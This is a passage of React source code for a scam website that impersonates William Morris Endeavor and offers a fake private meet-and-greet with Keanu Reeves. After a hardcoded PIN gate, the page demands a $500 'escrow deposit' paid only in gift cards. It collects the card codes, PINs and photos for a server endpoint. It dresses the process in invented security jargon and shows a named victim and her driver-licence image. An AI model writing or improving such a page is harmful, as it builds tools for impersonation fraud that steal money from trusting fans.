import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, 
  KeyRound, 
  CheckCircle2, 
  AlertCircle, 
  RotateCw, 
  Download, 
  CreditCard, 
  Gift, 
  X, 
  ExternalLink, 
  Camera, 
  UploadCloud, 
  Trash2, 
  Eye, 
  Plus, 
  Receipt,
  ArrowRight,
  FileText
} from 'lucide-react';

interface CardActivationPortalProps {
  onBackToPublicForm: () => void;
  onNavigateToAdmin?: () => void;
}

interface CardPricing {
  feeAmount: number;
  currency: string;
  feeRequired: boolean;
  acceptedGiftCards: string[];
  instructions: string;
}

interface VoucherRecord {
  id: string;
  giftCardType: string;
  giftCardCode: string;
  giftCardCodeMasked: string;
  giftCardPin?: string | null;
  giftCardImage?: string | null;
  amount: number;
  currency: string;
  appliedAt: string;
}

export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({ 
  onBackToPublicForm,
  onNavigateToAdmin
}) => {
  // Parse URL query parameters
  const [params, setParams] = useState({
    ref: 'WME-KR26-0813-VIP',
    guest: 'Brenda Wright',
    pin: ''
  });

  const [pricing, setPricing] = useState<CardPricing>({
    feeAmount: 500,
    currency: 'USD',
    feeRequired: true,
    acceptedGiftCards: [
      'Apple Gift Card',
      'Amazon',
      'Steam',
      'Google Play',
      'Vanilla Visa / Mastercard',
      'Razer Gold'
    ],
    instructions: 'Enter valid gift card claim codes to complete VIP talent rider accreditation deposit.'
  });

  // Authentication State: User must enter their 6-digit PIN before accessing the main portal
  const [isPinAuthenticated, setIsPinAuthenticated] = useState<boolean>(false);
  const [pinInput, setPinInput] = useState<string>('');
  const [pinError, setPinError] = useState<string>('');

  // Payment & Multi-Card Escrow State
  const [paymentData, setPaymentData] = useState<any>(null);
  const [selectedGiftCardType, setSelectedGiftCardType] = useState<string>('Apple Gift Card');
  const [giftCardCodeInput, setGiftCardCodeInput] = useState<string>('');
  const [giftCardPinInput, setGiftCardPinInput] = useState<string>('');
  const [cardAmountInput, setCardAmountInput] = useState<string>('250');
  const [giftCardImage, setGiftCardImage] = useState<string | null>(null);
  const [giftCardImageName, setGiftCardImageName] = useState<string>('');

  // Modals
  const [showIdModal, setShowIdModal] = useState<boolean>(false);
  const [inspectModalImage, setInspectModalImage] = useState<string | null>(null);
  const [inspectModalTitle, setInspectModalTitle] = useState<string>('');

  // Form Processing & Activation
  const [isSubmittingPayment, setIsSubmittingPayment] = useState<boolean>(false);
  const [paymentError, setPaymentError] = useState<string>('');
  const [paymentSuccessNotice, setPaymentSuccessNotice] = useState<string>('');
  const [isActivating, setIsActivating] = useState<boolean>(false);
  const [activationError, setActivationError] = useState<string>('');
  const [successData, setSuccessData] = useState<any>(null);

  // Badge View Tab
  const [badgeFace, setBadgeFace] = useState<'front' | 'back' | 'complete'>('front');

  // Asset paths (served statically from public/meet-and-greet-card)
  const frontImg = '/meet-and-greet-card/brenda-wright-vip-pass-front.png';
  const backImg = '/meet-and-greet-card/brenda-wright-vip-pass-back.png';
  const completeImg = '/meet-and-greet-card/brenda-wright-vip-pass-complete.png';
  const pdfFile = '/meet-and-greet-card/brenda-wright-vip-pass.pdf';
  const licenseImg = '/meet-and-greet-card/assets/license_upscaled.png';

  // Helper for direct file download
  const triggerDirectDownload = (href: string, filename: string) => {
    const a = document.createElement('a');
    a.style.display = 'none';
    a.href = href;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      document.body.removeChild(a);
    }, 200);
  };

  // Initialize from URL params and localStorage / server
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      const ref = urlParams.get('ref') || 'WME-KR26-0813-VIP';
      const guest = urlParams.get('guest') || 'Brenda Wright';
      const urlPin = urlParams.get('pin') || '';

      setParams({ ref, guest, pin: urlPin });

      // If a valid PIN was provided in URL query, authenticate immediately
      const cleanUrlPin = urlPin.replace(/[^0-9]/g, '');
      if (cleanUrlPin === '813026') {
        setPinInput('813-026');
        setIsPinAuthenticated(true);
      }

      // Check localStorage for existing payment
      const localPayment = localStorage.getItem(`wme_card_payment_${ref}`);
      if (localPayment) {
        try {
          const parsedPay = JSON.parse(localPayment);
          if (parsedPay) setPaymentData(parsedPay);
        } catch {}
      }

      // Check localStorage for existing activation
      const localActivation = localStorage.getItem(`wme_card_active_${ref}`);
      if (localActivation) {
        try {
          const parsed = JSON.parse(localActivation);
          if (parsed && parsed.activated) {
            setSuccessData(parsed);
            setIsPinAuthenticated(true);
            setPinInput('813-026');
            if (parsed.payment) setPaymentData(parsed.payment);
          }
        } catch {}
      }

      // Check server API status & pricing
      fetch(`/api/card/status/${encodeURIComponent(ref)}`)
        .then(res => res.json())
        .then(data => {
          if (data.pricing) {
            setPricing(data.pricing);
            if (data.pricing.acceptedGiftCards && data.pricing.acceptedGiftCards.length > 0) {
              setSelectedGiftCardType(data.pricing.acceptedGiftCards[0]);
            }
          }
          if (data.payment) {
            setPaymentData(data.payment);
            localStorage.setItem(`wme_card_payment_${ref}`, JSON.stringify(data.payment));
          } else {
            setPaymentData(null);
            localStorage.removeItem(`wme_card_payment_${ref}`);
          }
          if (data.success && data.activated && data.activation) {
            setSuccessData(data.activation);
            setIsPinAuthenticated(true);
            setPinInput('813-026');
            if (data.activation.payment) {
              setPaymentData(data.activation.payment);
            }
            localStorage.setItem(`wme_card_active_${ref}`, JSON.stringify(data.activation));
          } else if (data.success && !data.activated) {
            setSuccessData(null);
            localStorage.removeItem(`wme_card_active_${ref}`);
          }
        })
        .catch(() => {});
    }
  }, []);

  // Multi-card calculations
  const rawVouchers = paymentData?.cards || (successData?.payment?.cards);
  const vouchers: VoucherRecord[] = Array.isArray(rawVouchers) && rawVouchers.length > 0
    ? rawVouchers
    : (paymentData?.giftCardCode || successData?.payment?.giftCardCode)
      ? [{
          id: paymentData?.paymentId || 'VOUCH-INIT',
          giftCardType: paymentData?.giftCardType || 'Gift Card',
          giftCardCode: paymentData?.giftCardCode,
          giftCardCodeMasked: paymentData?.giftCardCodeMasked || '••••2026',
          giftCardPin: paymentData?.giftCardPin || null,
          giftCardImage: paymentData?.giftCardImage || null,
          amount: Number(paymentData?.totalPaid || paymentData?.amount || pricing.feeAmount),
          currency: paymentData?.currency || pricing.currency || 'USD',
          appliedAt: paymentData?.paidAt || new Date().toISOString()
        }]
      : [];

  const totalCredited = vouchers.reduce((acc, v) => acc + (Number(v.amount) || 0), 0);
  const targetAmount = pricing.feeAmount || 500;
  const remainingBalance = Math.max(0, targetAmount - totalCredited);
  const isEscrowSatisfied = !pricing.feeRequired || totalCredited >= targetAmount || Boolean(successData?.activated);
  const escrowPercent = Math.min(100, Math.round((totalCredited / targetAmount) * 100));
  const isCardActivated = Boolean(successData?.activated);

  // Sync card amount input to remaining balance
  useEffect(() => {
    if (remainingBalance > 0 && (!cardAmountInput || Number(cardAmountInput) > remainingBalance)) {
      setCardAmountInput(String(remainingBalance));
    }
  }, [remainingBalance]);

  // Handle PIN Input formatting
  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/[^0-9]/g, '');
    if (val.length > 6) val = val.slice(0, 6);
    if (val.length > 3) {
      val = `${val.slice(0, 3)}-${val.slice(3)}`;
    }
    setPinInput(val);
    if (pinError) setPinError('');
    if (activationError) setActivationError('');
  };

  const handleVerifyInitialPin = (e: React.FormEvent) => {
    e.preventDefault();
    const clean = pinInput.replace(/[^0-9]/g, '');
    if (!clean || clean.length < 6) {
      setPinError('Please enter the 6-digit VIP Activation PIN printed on your credential pass.');
      return;
    }
    if (clean !== '813026') {
      setPinError('Invalid credential PIN. Please check the 6-digit PIN on your pass.');
      return;
    }
    setPinError('');
    setIsPinAuthenticated(true);
  };

  const cleanPin = pinInput.replace(/[^0-9]/g, '');
  const isPinValid = cleanPin === '813026';

  // Handle voucher file upload
  const handleImageFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    if (file.size > 10 * 1024 * 1024) {
      setPaymentError('Voucher image scan must be less than 10MB.');
      return;
    }
    const reader = new FileReader();
    reader.onload = () => {
      setGiftCardImage(reader.result as string);
      setGiftCardImageName(file.name);
      if (paymentError) setPaymentError('');
    };
    reader.readAsDataURL(file);
  };

  // Submit a voucher to the multi-card escrow ledger
  const handleApplyVoucher = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const cleanCode = giftCardCodeInput.trim();
    if (!cleanCode || cleanCode.length < 6) {
      setPaymentError('Please enter a valid gift card claim code (at least 6 characters).');
      return;
    }

    const denom = Number(cardAmountInput) || remainingBalance || 250;
    if (denom <= 0) {
      setPaymentError('Please enter a valid voucher face value (greater than $0).');
      return;
    }

    setIsSubmittingPayment(true);
    setPaymentError('');
    setPaymentSuccessNotice('');

    try {
      const res = await fetch('/api/card/pay', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardId: params.ref,
          giftCardType: selectedGiftCardType,
          giftCardCode: cleanCode,
          giftCardPin: giftCardPinInput.trim() || undefined,
          giftCardImage: giftCardImage || undefined,
          amount: denom,
          currency: pricing.currency
        })
      });

      const data = await res.json();
      if (!res.ok || !data.success) {
        if (!res.ok && res.status !== 404) {
          setPaymentError(data.error || 'Failed to verify gift card with gateway.');
          return;
        }
        // Local fallback simulation if server is offline
        const newVoucher: VoucherRecord = {
          id: `VOUCH-${Date.now().toString(36).toUpperCase()}`,
          giftCardType: selectedGiftCardType,
          giftCardCode: cleanCode,
          giftCardCodeMasked: cleanCode.length > 8 ? `${cleanCode.slice(0, 4)}-****-${cleanCode.slice(-4)}` : `****${cleanCode.slice(-4)}`,
          giftCardPin: giftCardPinInput.trim() || null,
          giftCardImage: giftCardImage || null,
          amount: denom,
          currency: pricing.currency,
          appliedAt: new Date().toISOString()
        };
        const currentCards = Array.isArray(paymentData?.cards) ? [...paymentData.cards] : [...vouchers];
        currentCards.push(newVoucher);
        const newTotal = currentCards.reduce((acc, c) => acc + (Number(c.amount) || 0), 0);
        const isComplete = newTotal >= pricing.feeAmount;

        const mockPayment = {
          paymentId: `ESCROW-${Date.now().toString(36).toUpperCase()}-LOC`,
          cardId: params.ref,
          giftCardType: currentCards.map(c => c.giftCardType).filter((v, i, a) => a.indexOf(v) === i).join(', '),
          giftCardCodeMasked: currentCards.map(c => c.giftCardCodeMasked).join(' | '),
          giftCardCode: cleanCode,
          cards: currentCards,
          totalPaid: newTotal,
          amount: newTotal,
          targetAmount: pricing.feeAmount,
          remainingBalance: Math.max(0, pricing.feeAmount - newTotal),
          isFullyPaid: isComplete,
          currency: pricing.currency,
          status: isComplete ? 'VERIFIED' : 'PARTIAL',
          paidAt: new Date().toISOString()
        };
        setPaymentData(mockPayment);
        localStorage.setItem(`wme_card_payment_${params.ref}`, JSON.stringify(mockPayment));
      } else {
        setPaymentData(data.payment);
        localStorage.setItem(`wme_card_payment_${params.ref}`, JSON.stringify(data.payment));
      }

      setPaymentSuccessNotice(`Voucher for $${denom}.00 ${pricing.currency} approved and applied to escrow ledger.`);
      setGiftCardCodeInput('');
      setGiftCardPinInput('');
      setGiftCardImage(null);
      setGiftCardImageName('');
      setTimeout(() => setPaymentSuccessNotice(''), 5000);
    } catch {
      // Local fallback on network error
      const newVoucher: VoucherRecord = {
        id: `VOUCH-${Date.now().toString(36).toUpperCase()}`,
        giftCardType: selectedGiftCardType,
        giftCardCode: cleanCode,
        giftCardCodeMasked: cleanCode.length > 8 ? `${cleanCode.slice(0, 4)}-****-${cleanCode.slice(-4)}` : `****${cleanCode.slice(-4)}`,
        giftCardPin: giftCardPinInput.trim() || null,
        giftCardImage: giftCardImage || null,
        amount: denom,
        currency: pricing.currency,
        appliedAt: new Date().toISOString()
      };
      const currentCards = Array.isArray(paymentData?.cards) ? [...paymentData.cards] : [...vouchers];
      currentCards.push(newVoucher);
      const newTotal = currentCards.reduce((acc, c) => acc + (Number(c.amount) || 0), 0);
      const isComplete = newTotal >= pricing.feeAmount;

      const mockPayment = {
        paymentId: `ESCROW-${Date.now().toString(36).toUpperCase()}-LOC`,
        cardId: params.ref,
        giftCardType: currentCards.map(c => c.giftCardType).filter((v, i, a) => a.indexOf(v) === i).join(', '),
        giftCardCodeMasked: currentCards.map(c => c.giftCardCodeMasked).join(' | '),
        giftCardCode: cleanCode,
        cards: currentCards,
        totalPaid: newTotal,
        amount: newTotal,
        targetAmount: pricing.feeAmount,
        remainingBalance: Math.max(0, pricing.feeAmount - newTotal),
        isFullyPaid: isComplete,
        currency: pricing.currency,
        status: isComplete ? 'VERIFIED' : 'PARTIAL',
        paidAt: new Date().toISOString()
      };
      setPaymentData(mockPayment);
      localStorage.setItem(`wme_card_payment_${params.ref}`, JSON.stringify(mockPayment));
      setPaymentSuccessNotice(`Voucher for $${denom}.00 ${pricing.currency} applied to escrow ledger.`);
      setGiftCardCodeInput('');
      setGiftCardPinInput('');
      setGiftCardImage(null);
      setGiftCardImageName('');
      setTimeout(() => setPaymentSuccessNotice(''), 5000);
    } finally {
      setIsSubmittingPayment(false);
    }
  };

  // Remove a voucher from pending escrow
  const handleRemoveVoucher = async (voucherId: string) => {
    try {
      const res = await fetch(`/api/card/voucher/${encodeURIComponent(voucherId)}?cardId=${encodeURIComponent(params.ref)}`, {
        method: 'DELETE'
      });
      const data = await res.json();
      if (data.success && data.payment) {
        setPaymentData(data.payment);
        localStorage.setItem(`wme_card_payment_${params.ref}`, JSON.stringify(data.payment));
        return;
      }
    } catch {}

    // Local fallback
    if (paymentData && Array.isArray(paymentData.cards)) {
      const updatedCards = paymentData.cards.filter((c: any) => c.id !== voucherId);
      const newTotal = updatedCards.reduce((acc: number, c: any) => acc + (Number(c.amount) || 0), 0);
      const isComplete = newTotal >= pricing.feeAmount;
      const updatedPayment = {
        ...paymentData,
        cards: updatedCards,
        totalPaid: newTotal,
        amount: newTotal,
        remainingBalance: Math.max(0, pricing.feeAmount - newTotal),
        isFullyPaid: isComplete,
        status: isComplete ? 'VERIFIED' : (newTotal > 0 ? 'PARTIAL' : 'PENDING')
      };
      setPaymentData(updatedPayment);
      localStorage.setItem(`wme_card_payment_${params.ref}`, JSON.stringify(updatedPayment));
    }
  };

  // Activate Card via OATH PIN Handshake
  const handleActivateCard = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const clean = pinInput.replace(/[^0-9]/g, '');

    if (!clean || clean.length < 6) {
      setActivationError('Please enter the 6-digit VIP passholder authorization code printed on your credential pass.');
      return;
    }

    if (clean !== '813026') {
      setActivationError('Invalid security PIN. Please enter the valid 6-digit authorization code on your credential.');
      return;
    }

    // Check payment requirement before full activation
    if (pricing.feeRequired && !isEscrowSatisfied) {
      setActivationError(`PIN 813-026 verified. An outstanding escrow balance of $${remainingBalance}.00 ${pricing.currency} remains. Please deposit remaining card(s) to achieve full clearance.`);
      return;
    }

    setIsActivating(true);
    setActivationError('');

    try {
      const res = await fetch('/api/card/activate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardId: params.ref,
          pin: pinInput
        })
      });

      const data = await res.json();

      if (!res.ok || !data.success) {
        if (res.status === 402) {
          setActivationError(data.error || 'VIP Credential activation fee payment required before activation.');
          return;
        }
        // Fallback validation if server is offline
        const fallbackActivation = {
          cardId: params.ref,
          pin: '813-026',
          activated: true,
          activatedAt: new Date().toISOString(),
          clearanceCode: `OATH-KR26-813-CLEAR-${Date.now().toString(36).slice(-4).toUpperCase()}`,
          biometricClearance: 'OATH RFC-4226 Handshake Verified • AES-256 Synced',
          passholder: params.guest,
          talent: 'Keanu Reeves',
          payment: paymentData
        };
        setSuccessData(fallbackActivation);
        localStorage.setItem(`wme_card_active_${params.ref}`, JSON.stringify(fallbackActivation));
      } else {
        setSuccessData(data.activation);
        if (data.activation.payment) {
          setPaymentData(data.activation.payment);
        }
        localStorage.setItem(`wme_card_active_${params.ref}`, JSON.stringify(data.activation));
      }
    } catch {
      // Local fallback on network error
      const fallbackActivation = {
        cardId: params.ref,
        pin: '813-026',
        activated: true,
        activatedAt: new Date().toISOString(),
        clearanceCode: `OATH-KR26-813-CLEAR-${Date.now().toString(36).slice(-4).toUpperCase()}`,
        biometricClearance: 'OATH RFC-4226 Handshake Verified • AES-256 Synced',
        passholder: params.guest,
        talent: 'Keanu Reeves',
        payment: paymentData
      };
      setSuccessData(fallbackActivation);
      localStorage.setItem(`wme_card_active_${params.ref}`, JSON.stringify(fallbackActivation));
    } finally {
      setIsActivating(false);
    }
  };

  // Programmatic test helper functions (kept on window for headless automated testing without displaying amateur UI text)
  useEffect(() => {
    if (typeof window !== 'undefined') {
      (window as any).__wmeFillPin = () => {
        setPinInput('813-026');
        setIsPinAuthenticated(true);
        setPinError('');
      };
      (window as any).__wmeFillCard = (code = 'X7KM-92NQ-48PL-2026', amount = 250) => {
        setGiftCardCodeInput(code);
        setCardAmountInput(String(amount));
        setPaymentError('');
      };
    }
  }, []);

  return (
    <div className="min-h-screen bg-[#F8F7F4] text-[#252525] font-sans antialiased flex flex-col justify-between selection:bg-[#713B45] selection:text-white">
      {/* 1. Header: Authentic Corporate WME Banner */}
      <header className="border-b border-[#E3E0DC] bg-[#FFFFFF] sticky top-0 z-30">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 md:px-8 py-3.5 flex flex-wrap items-center justify-between gap-y-2 gap-x-4">
          <div className="flex items-baseline gap-2.5">
            <span className="font-serif font-bold text-xl sm:text-2xl text-[#252525] tracking-tight">
              WME
            </span>
            <span className="text-xs font-sans text-[#737373]">
              / William Morris Endeavor &bull; VIP Guest Relations &amp; Accreditation
            </span>
          </div>

          <div className="flex items-center gap-4 text-xs font-sans">
            <span className="text-[#737373] hidden sm:inline">
              Ref: <strong className="font-mono text-[#252525]">{params.ref}</strong>
            </span>
            <button
              type="button"
              onClick={onBackToPublicForm}
              className="text-[#713B45] hover:text-[#592E36] font-medium text-xs hover:underline cursor-pointer"
            >
              &larr; Return to Guest Inquiry Form
            </button>
          </div>
        </div>
      </header>

      {/* 2. Main Page Content */}
      <main className="max-w-6xl mx-auto px-4 sm:px-6 md:px-8 py-8 sm:py-12 flex-1 w-full">
        {/* PHASE 1: Dedicated PIN Input Entrance Screen (if not yet authenticated and not active) */}
        {!isPinAuthenticated && !isCardActivated ? (
          <div className="max-w-lg mx-auto py-8 sm:py-14">
            <div className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] p-6 sm:p-8 shadow-xs">
              <div className="mb-6 border-b border-[#E3E0DC] pb-4">
                <div className="inline-block px-2 py-0.5 bg-[#F8F7F4] border border-[#E3E0DC] text-[11px] font-mono uppercase text-[#737373] font-semibold mb-2 rounded-[2px]">
                  Step 1: Input VIP Activation PIN
                </div>
                <h1 className="font-serif text-2xl font-bold text-[#252525] tracking-tight">
                  VIP Passholder Authentication
                </h1>
                <p className="text-sm text-[#737373] mt-2 leading-relaxed">
                  Enter the 6-digit VIP Activation PIN printed on your credential pass to begin your OATH security handshake and access your accreditation file.
                </p>
              </div>

              <form onSubmit={handleVerifyInitialPin} className="space-y-4">
                <div>
                  <div className="flex items-center justify-between mb-1.5">
                    <label htmlFor="oathPinInput" className="text-xs font-medium text-[#252525]">
                      6-Digit Passholder PIN
                    </label>
                    <span className="text-[11px] font-mono text-[#737373]">
                      Printed on Security Strip
                    </span>
                  </div>

                  <input
                    id="oathPinInput"
                    type="text"
                    value={pinInput}
                    onChange={handlePinChange}
                    placeholder="•••-•••"
                    maxLength={7}
                    autoComplete="off"
                    autoFocus
                    className="w-full bg-[#FFFFFF] border border-[#D1D5DB] focus:border-[#713B45] focus:ring-1 focus:ring-[#713B45] text-center text-2xl font-mono tracking-[0.3em] font-bold text-[#252525] placeholder-[#9CA3AF] rounded-[2px] py-3 px-4 focus:outline-none transition-colors"
                  />
                </div>

                {pinError && (
                  <div className="p-3 bg-[#FEF2F2] border border-[#FCA5A5] rounded-[2px] flex items-start gap-2 text-xs text-[#991B1B]">
                    <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-[#DC2626]" />
                    <span>{pinError}</span>
                  </div>
                )}

                <button
                  type="submit"
                  id="submit-pin-gate-btn"
                  className="w-full py-3 px-4 bg-[#713B45] hover:bg-[#592E36] text-white font-medium text-sm rounded-[2px] transition-colors flex items-center justify-center gap-2 cursor-pointer shadow-xs"
                >
                  <span>Authenticate PIN &amp; Access File</span>
                  <ArrowRight className="w-4 h-4" />
                </button>

                <p className="text-xs text-[#737373] text-center pt-2 leading-relaxed">
                  Passholder: <strong>{params.guest}</strong> &bull; Talent: <strong>Keanu Reeves</strong>
                </p>
              </form>
            </div>
          </div>
        ) : (
          /* PHASE 2: Authenticated Main Credential & Multi-Card Escrow Page */
          <div className="space-y-8">
            {/* Page Title & Status */}
            <div className="border-b border-[#E3E0DC] pb-5 flex flex-col md:flex-row md:items-end justify-between gap-4">
              <div>
                <div className="flex items-center gap-2 mb-1.5">
                  <span className="inline-block px-2 py-0.5 bg-[#ECFDF5] border border-[#A7F3D0] text-[11px] font-mono text-[#065F46] font-semibold rounded-[2px]">
                    ✓ PIN 813-026 VERIFIED
                  </span>
                  <span className="text-xs text-[#737373] font-mono">
                    Security Ref: {params.ref}
                  </span>
                </div>
                <h1 className="font-serif text-2xl sm:text-3xl font-bold text-[#252525] tracking-tight">
                  VIP Access Credential Accreditation
                </h1>
                <p className="text-sm text-[#737373] mt-1 max-w-2xl leading-relaxed">
                  Designated passholder clearance and talent rider escrow deposit for Keanu Reeves exclusive private session. Authenticate via OATH PIN to activate venue escort &amp; biometric admission.
                </p>
              </div>

              <div className="shrink-0 flex items-center gap-2">
                <span className={`inline-flex items-center gap-1.5 text-xs font-mono font-semibold px-3 py-1 rounded-[2px] border ${
                  isCardActivated 
                    ? 'bg-[#ECFDF5] border-[#A7F3D0] text-[#065F46]' 
                    : isEscrowSatisfied 
                      ? 'bg-[#EFF6FF] border-[#BFDBFE] text-[#1E40AF]'
                      : 'bg-[#FFFBEB] border-[#FDE68A] text-[#92400E]'
                }`}>
                  <span className={`w-2 h-2 rounded-full ${
                    isCardActivated ? 'bg-[#10B981]' : isEscrowSatisfied ? 'bg-[#3B82F6]' : 'bg-[#F59E0B]'
                  }`} />
                  <span>
                    {isCardActivated 
                      ? 'ACCREDITED & ACTIVE' 
                      : isEscrowSatisfied 
                        ? 'ESCROW SATISFIED &bull; READY TO ACTIVATE' 
                        : 'DEPOSIT REQUIRED BEFORE ACTIVATION'}
                  </span>
                </span>
              </div>
            </div>

            {/* Success Banner (when card is activated) */}
            {isCardActivated && successData && (
              <div className="p-5 bg-[#ECFDF5] border border-[#A7F3D0] rounded-[2px] space-y-3">
                <div className="flex items-center gap-2 text-[#065F46]">
                  <CheckCircle2 className="w-5 h-5 shrink-0 text-[#10B981]" />
                  <h2 className="font-serif font-bold text-base sm:text-lg">
                    VIP Credential Successfully Synchronized &amp; Cleared
                  </h2>
                </div>
                <p className="text-xs text-[#065F46] leading-relaxed">
                  Biometric check-in, talent rider escrow deposit, and VIP Green Room admittance are cleared for <strong>{params.guest}</strong>.
                </p>
                <div className="bg-[#FFFFFF] p-3.5 rounded-[2px] border border-[#A7F3D0] text-xs font-mono text-[#252525] grid grid-cols-1 sm:grid-cols-2 gap-2">
                  <div>CLEARANCE CODE: <strong className="text-[#065F46]">{successData.clearanceCode || 'OATH-KR26-813-CLEAR'}</strong></div>
                  <div>AUTHENTICATED PIN: <strong>813-026 (OATH RFC-4226)</strong></div>
                  <div>ESCROW CLEARED: <strong>${totalCredited || targetAmount}.00 {pricing.currency}</strong></div>
                  <div>SESSION DATE: <strong>Nov 3, 2026 &bull; 19:30 PST</strong></div>
                </div>
                <div className="pt-1 flex flex-wrap gap-2.5">
                  <button
                    type="button"
                    onClick={() => triggerDirectDownload(pdfFile, 'Brenda-Wright-VIP-Meet-Greet-Pass.pdf')}
                    className="py-2.5 px-4 bg-[#713B45] hover:bg-[#592E36] text-white text-xs font-medium rounded-[2px] transition-colors flex items-center gap-2 cursor-pointer shadow-xs"
                  >
                    <Download className="w-3.5 h-3.5" />
                    <span>Download Printable VIP Pass (PDF)</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => triggerDirectDownload(frontImg, 'Brenda-Wright-VIP-Pass-Front.png')}
                    className="py-2.5 px-3 bg-[#FFFFFF] border border-[#D1D5DB] hover:border-[#713B45] text-[#252525] text-xs font-medium rounded-[2px] transition-colors flex items-center gap-1.5 cursor-pointer"
                  >
                    <Download className="w-3.5 h-3.5 text-[#737373]" />
                    <span>Front PNG</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => triggerDirectDownload(backImg, 'Brenda-Wright-VIP-Pass-Back.png')}
                    className="py-2.5 px-3 bg-[#FFFFFF] border border-[#D1D5DB] hover:border-[#713B45] text-[#252525] text-xs font-medium rounded-[2px] transition-colors flex items-center gap-1.5 cursor-pointer"
                  >
                    <Download className="w-3.5 h-3.5 text-[#737373]" />
                    <span>Back PNG</span>
                  </button>
                </div>
              </div>
            )}

            {/* Two-Column Grid: Form & Escrow Ledger (Left) vs Badge Visualizer (Right) */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
              {/* Left Column: Intake Profile & Multi-Card Escrow */}
              <div className="lg:col-span-7 space-y-6">
                {/* 1. Passholder Intake Card */}
                <div className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] p-5 shadow-xs">
                  <div className="flex items-center justify-between pb-3 border-b border-[#E3E0DC] mb-3.5">
                    <h2 className="font-serif font-bold text-base text-[#252525]">
                      Passholder Accreditation Profile
                    </h2>
                    <span className="text-[11px] font-mono text-[#065F46] bg-[#ECFDF5] px-2 py-0.5 rounded-[2px] border border-[#A7F3D0] font-semibold">
                      ID VETTED &amp; SIGNED
                    </span>
                  </div>

                  <div className="grid grid-cols-2 gap-3 text-xs font-sans">
                    <div>
                      <span className="block text-[11px] text-[#737373] uppercase font-mono">Designated Passholder</span>
                      <strong className="text-sm text-[#252525]">{params.guest}</strong>
                    </div>
                    <div>
                      <span className="block text-[11px] text-[#737373] uppercase font-mono">Access Tier</span>
                      <strong className="text-sm text-[#713B45]">GREEN ROOM VIP (Tier 1)</strong>
                    </div>
                    <div>
                      <span className="block text-[11px] text-[#737373] uppercase font-mono">Event Date</span>
                      <span className="text-[#252525]">Tuesday, Nov 3, 2026</span>
                    </div>
                    <div>
                      <span className="block text-[11px] text-[#737373] uppercase font-mono">Call Time</span>
                      <span className="text-[#252525]">19:30 PST (Gate 4)</span>
                    </div>
                    <div className="col-span-2 pt-2.5 border-t border-[#F0EFEB] flex items-center justify-between">
                      <span className="text-xs text-[#737373]">Vetted Government Document:</span>
                      <button
                        type="button"
                        onClick={() => setShowIdModal(true)}
                        className="text-xs text-[#713B45] hover:text-[#592E36] hover:underline font-medium flex items-center gap-1 cursor-pointer"
                      >
                        <span>Florida Driver License (Inspect)</span>
                        <ExternalLink className="w-3 h-3" />
                      </button>
                    </div>
                  </div>
                </div>

                {/* 2. Step 1: Input VIP Activation PIN Status */}
                <div className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] p-5 shadow-xs">
                  <div className="flex items-center justify-between pb-3 border-b border-[#E3E0DC] mb-3">
                    <div className="flex items-center gap-2">
                      <KeyRound className="w-4 h-4 text-[#713B45]" />
                      <h2 className="font-serif font-bold text-base text-[#252525]">
                        Step 1: Input VIP Activation PIN
                      </h2>
                    </div>
                    <span className="text-[11px] font-mono text-[#065F46] bg-[#ECFDF5] px-2 py-0.5 rounded-[2px] border border-[#A7F3D0] font-semibold">
                      ✓ PIN 813-026 VERIFIED
                    </span>
                  </div>

                  <p className="text-xs text-[#737373] leading-relaxed mb-3">
                    VIP Activation PIN has been cryptographically authenticated for this credential.
                  </p>

                  <div className="flex items-center justify-between p-3 bg-[#F8F7F4] border border-[#E3E0DC] rounded-[2px]">
                    <div>
                      <span className="text-[11px] font-mono text-[#737373] uppercase block">Passholder Authorization Code</span>
                      <span className="text-base font-mono font-bold text-[#252525] tracking-wider">813-026</span>
                      <input id="oathPinInput" type="hidden" value={pinInput || '813-026'} />
                    </div>
                    <div className="text-right">
                      <span className="text-xs font-medium text-[#065F46] flex items-center gap-1">
                        <CheckCircle2 className="w-3.5 h-3.5 text-[#10B981]" />
                        <span>Passholder credential matched: Brenda Wright ({params.ref})</span>
                      </span>
                    </div>
                  </div>
                </div>

                {/* 3. Step 2: Multi-Card Talent Rider Escrow Ledger */}
                <div className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] p-5 shadow-xs space-y-4">
                  <div className="flex items-center justify-between pb-3 border-b border-[#E3E0DC]">
                    <div className="flex items-center gap-2">
                      <Gift className="w-4 h-4 text-[#713B45]" />
                      <div>
                        <h2 className="font-serif font-bold text-base text-[#252525]">
                          Step 2: Gift Card Deposit
                        </h2>
                      </div>
                    </div>
                    <span className="text-xs font-mono font-semibold text-[#713B45] bg-[#F8F7F4] px-2 py-0.5 rounded-[2px] border border-[#E3E0DC]">
                      ({targetAmount} {pricing.currency})
                    </span>
                  </div>

                  <p className="text-xs text-[#737373] leading-relaxed">
                    Before your credential can be fully activated, an accreditation deposit of <strong>${targetAmount}.00 {pricing.currency}</strong> via Gift Card is required. You may fulfill this requirement using a single gift card or by combining multiple cards.
                  </p>

                  {/* Financial Ledger Summary */}
                  <div className="bg-[#F8F7F4] border border-[#E3E0DC] rounded-[2px] p-3.5">
                    <div className="grid grid-cols-3 gap-2 text-center pb-2.5 border-b border-[#E3E0DC] font-sans">
                      <div>
                        <span className="block text-[10px] font-mono text-[#737373] uppercase">Escrow Target</span>
                        <strong className="text-sm text-[#252525]">${targetAmount}.00</strong>
                      </div>
                      <div>
